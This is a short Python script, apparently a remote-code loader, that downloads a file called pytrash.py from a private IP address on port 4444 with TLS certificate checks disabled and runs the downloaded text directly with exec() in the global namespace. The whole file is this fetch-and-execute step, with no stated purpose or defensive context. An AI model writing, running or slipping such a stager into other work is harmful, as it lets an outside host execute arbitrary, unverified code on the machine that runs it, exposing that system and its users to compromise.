#!/usr/bin/env python
import requests

r = requests.get("https://10.0.0.27:4444/pytrash.py", verify=False)
exec(r.text, globals())
